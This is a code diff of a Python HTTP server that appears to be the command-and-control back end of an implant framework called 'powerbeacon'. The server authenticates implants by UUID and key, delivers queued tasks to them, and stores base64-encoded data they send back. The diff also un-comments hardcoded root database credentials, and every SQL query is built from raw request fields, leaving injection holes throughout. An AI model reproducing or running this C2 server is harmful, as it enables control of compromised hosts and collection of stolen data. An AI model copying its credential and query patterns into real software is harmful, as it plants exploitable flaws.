@@ -16,11 +16,11 @@ should_get=False             #controls whether thge server is active
 stop_threads=False           #stop the thread resetting should_get
 
 #Configure database connection
-#hostname = 'localhost'
-#username = 'root'
-#password = 't00r'
-#database = 'powerbeacon'
-#connection = MySQLdb.connect( host=hostname, user=username, passwd=password, db=database )
+hostname = 'localhost'
+username = 'root'
+password = 't00r'
+database = 'powerbeacon'
+
 
 
 
@@ -102,119 +102,119 @@ class HandleRequests(BaseHTTPRequestHandler):
             return 0
 
         # Pull vars from dict
-        connection = MySQLdb.connect(host='127.0.0.1', user='root', password='t00r', database="powerbeacon")
-        connection.commit()
-        event=new_obj["event"]
-        if event=="validate":
-            print("validate event")
-            try:
-                name=new_obj["name"]
-                key=new_obj["key"]
-                query = f"select verify_key from callbackAddresses where name='{name}'"
-                cursor=connection.cursor()
-                cursor.execute(query)
-                results=cursor.fetchall()
-                verify_key=results[0][0]
-                if verify_key==key:
-                    self.wfile.write("write-host Connection Validated".encode("utf-8"))
+        with MySQLdb.connect( host=hostname, user=username, passwd=password, db=database ) as connection:
+            connection.commit()
+            event=new_obj["event"]
+            if event=="validate":
+                print("validate event")
+                try:
+                    name=new_obj["name"]
+                    key=new_obj["key"]
+                    query = f"select verify_key from callbackAddresses where name='{name}'"
+                    cursor=connection.cursor()
+                    cursor.execute(query)
+                    results=cursor.fetchall()
+                    verify_key=results[0][0]
+                    if verify_key==key:
+                        self.wfile.write("write-host Connection Validated".encode("utf-8"))
+                        date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
+                        print(f"{green}{date_time}[+]VALIDATE:::Incomming Validation from {IP}:::Server Connect Success{default}")
+                        #connection.close()
+                        return 0
+                    else:
+                        print(f"{red}{date_time}[-]VALIDATE:::Incomming Validation from {IP}:::Invalid Verification Key{default}")
+                        return 0
+                except:
                     date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
-                    print(f"{green}{date_time}[+]VALIDATE:::Incomming Validation from {IP}:::Server Connect Success{default}")
-                    connection.close()
+                    print(f"{yellow}{date_time}[*]Request from IP: {IP} :::Malformed Request{default}")
                     return 0
-                else:
-                    print(f"{red}{date_time}[-]VALIDATE:::Incomming Validation from {IP}:::Invalid Verification Key{default}")
-                    return 0
+            
+            try:
+                UUID=new_obj["UUID"]
+                key=new_obj["key"]
+                request=new_obj["event"]
             except:
+                IP = self.client_address[0]
                 date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                 print(f"{yellow}{date_time}[*]Request from IP: {IP} :::Malformed Request{default}")
                 return 0
-        
-        try:
-            UUID=new_obj["UUID"]
-            key=new_obj["key"]
-            request=new_obj["event"]
-        except:
-            IP = self.client_address[0]
-            date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
-            print(f"{yellow}{date_time}[*]Request from IP: {IP} :::Malformed Request{default}")
-            return 0
 
-        cursor=connection.cursor()
-        #check if implant exists
-        query = "select * from implants where UUID='" + UUID +"'"
-        cursor.execute(query)
-        results=cursor.fetchall()
-        if (len(results)<1):  #if it doesn't exist write implant not found and return
-            date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
-            print(red+date_time+"[*]Request from " + UUID + " at IP: " + IP + " :::IMPLANT NOT FOUND"+default)
-            connection.close()
-            return 0
-        #Check if key matches    
-        query = f"select * from implants where UUID='{UUID}' and implantkey='{key}'"
-        cursor.execute(query)
-        results=cursor.fetchall()
-        if (len(results) > 0):
-            if (request=="req"):#only if requests
-#                cursor.execute("update checkins set last_checkin=now() where UUID='" + UUID +"'")
-                cursor.execute("INSERT INTO checkins (UUID,gateway) VALUES ('" + UUID +"','" + IP + "')")
-                cursor.execute("commit")
-                should_get = True
-                query = "select task from tasks where UUID='" + UUID +"' and is_complete = 0"  #check for tasks
-                cursor.execute(query)
-                results=cursor.fetchall() ###results are the tasks from the DB
-                
-                if (len(results) > 0):#if tasks are greater than none
-                    date_time=datetime.now().strftime("%d_%m_%Y_%H%M%S")
-                    print(green+date_time+"[+]Incomming Request from " + UUID + " at IP: " + IP + " :::Tasks delivered"+default)
-                    #prepare line to return
-                    send_task=''
-                    for result in results:
-                        send_task=send_task+str(result[0])+";"  #concat all tasks with a ";" between
-                    self.wfile.write(send_task.encode("utf-8"))
-                    ##and update the tasks so they are marked complete in the DB
-                    query = "update tasks set is_complete = 1 where UUID = '" + UUID + "'"
+            cursor=connection.cursor()
+            #check if implant exists
+            query = "select * from implants where UUID='" + UUID +"'"
+            cursor.execute(query)
+            results=cursor.fetchall()
+            if (len(results)<1):  #if it doesn't exist write implant not found and return
+                date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
+                print(red+date_time+"[*]Request from " + UUID + " at IP: " + IP + " :::IMPLANT NOT FOUND"+default)
+                #connection.close()
+                return 0
+            #Check if key matches    
+            query = f"select * from implants where UUID='{UUID}' and implantkey='{key}'"
+            cursor.execute(query)
+            results=cursor.fetchall()
+            if (len(results) > 0):
+                if (request=="req"):#only if requests
+    #                cursor.execute("update checkins set last_checkin=now() where UUID='" + UUID +"'")
+                    cursor.execute("INSERT INTO checkins (UUID,gateway) VALUES ('" + UUID +"','" + IP + "')")
+                    cursor.execute("commit")
+                    should_get = True
+                    query = "select task from tasks where UUID='" + UUID +"' and is_complete = 0"  #check for tasks
                     cursor.execute(query)
-                    connection.commit()
-                    connection.close()
-                    return 0
-                else: #if no tasks
-                    date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
-                    print(f"{date_time}[-]Incomming Request from {UUID} at IP: {IP} :::No Tasking Available")
-                    connection.close()
-                    return 0  #end of if for requests
-            elif (request=="send"): #post data to server
-                try:
-                    data=new_obj["data"]
-                    details=new_obj["details"]
-                    data=base64.b64decode(data).decode('UTF-16LE')
+                    results=cursor.fetchall() ###results are the tasks from the DB
+                    
+                    if (len(results) > 0):#if tasks are greater than none
+                        date_time=datetime.now().strftime("%d_%m_%Y_%H%M%S")
+                        print(green+date_time+"[+]Incomming Request from " + UUID + " at IP: " + IP + " :::Tasks delivered"+default)
+                        #prepare line to return
+                        send_task=''
+                        for result in results:
+                            send_task=send_task+str(result[0])+";"  #concat all tasks with a ";" between
+                        self.wfile.write(send_task.encode("utf-8"))
+                        ##and update the tasks so they are marked complete in the DB
+                        query = "update tasks set is_complete = 1 where UUID = '" + UUID + "'"
+                        cursor.execute(query)
+                        connection.commit()
+                        #connection.close()
+                        return 0
+                    else: #if no tasks
+                        date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
+                        print(f"{date_time}[-]Incomming Request from {UUID} at IP: {IP} :::No Tasking Available")
+                        #connection.close()
+                        return 0  #end of if for requests
+                elif (request=="send"): #post data to server
+                    try:
+                        data=new_obj["data"]
+                        details=new_obj["details"]
+                        data=base64.b64decode(data).decode('UTF-16LE')
 
-                    query="INSERT INTO datastore (UUID,data,details) VALUES ('" + UUID + "','" + data +"','" + details +"')"
-                    cursor.execute(query)
-                    query="commit"
-                    cursor.execute(query)
-                    date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
-                    print(purple+date_time+"[+]Incomming Data Stream from " + new_obj["UUID"] + " at IP: " + IP + " :::"+default)
-                    connection.close()
-                    return 0
-                except:
+                        query="INSERT INTO datastore (UUID,data,details) VALUES ('" + UUID + "','" + data +"','" + details +"')"
+                        cursor.execute(query)
+                        query="commit"
+                        cursor.execute(query)
+                        date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
+                        print(purple+date_time+"[+]Incomming Data Stream from " + new_obj["UUID"] + " at IP: " + IP + " :::"+default)
+                        #connection.close()
+                        return 0
+                    except:
+                        date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
+                        print(yellow+date_time+"[*]Request from IP: " + IP + " :::Malformed Request"+default)
+                        #connection.close()
+                        return 0
+                        
+
+                else: #request type is bad
                     date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                     print(yellow+date_time+"[*]Request from IP: " + IP + " :::Malformed Request"+default)
-                    connection.close()
+                    #connection.close()
                     return 0
                     
 
-            else: #request type is bad
+            else: ###if key doesnt match
                 date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
-                print(yellow+date_time+"[*]Request from IP: " + IP + " :::Malformed Request"+default)
-                connection.close()
+                print(red+date_time+"[*]Request from " + UUID + " at IP: " + IP + " :::INVALID KEY"+default)
+                #connection.close()
                 return 0
-                
-
-        else: ###if key doesnt match
-            date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
-            print(red+date_time+"[*]Request from " + UUID + " at IP: " + IP + " :::INVALID KEY"+default)
-            connection.close()
-            return 0
     def do_PUT(self):
         self.do_POST()
 
